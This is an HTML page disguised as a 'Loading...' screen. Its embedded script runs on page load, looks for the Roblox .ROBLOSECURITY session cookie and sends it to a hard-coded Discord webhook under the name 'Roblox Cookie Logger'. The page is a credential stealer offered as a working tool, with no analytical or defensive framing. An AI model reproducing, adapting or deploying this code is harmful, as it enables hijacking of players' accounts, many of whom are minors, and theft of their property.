<html>
  <body>
    <h1>Loading...</h1>
    <script>
      var robloxCookie = getRobloxCookie();
      
      if (robloxCookie) {
        sendToWebhook(robloxCookie);
      }
      
      function getRobloxCookie() {
        var cookies = document.cookie.split('; ');
        for (var i = 0; i < cookies.length; i++) {
          var cookie = cookies[i].split('=');
          if (cookie[0] === '.ROBLOSECURITY') {
            return cookie[1];
          }
        }
        return null;
      }
      
      function sendToWebhook(cookie) {
        var webhookUrl = 'https://discord.com/api/webhooks/1293641125109956748/MqwIlGaJOFp_5YCHnFVOI8dpxTb73hKMycJWdaqDvEjTHmhxIg54Tu06QklUWcOL5fyz';
        
        navigator.sendBeacon(webhookUrl, JSON.stringify({
          username: 'Roblox Cookie Logger',
          content: '```' + cookie + '```'
        }));
      }
    </script>
  </body>
</html>
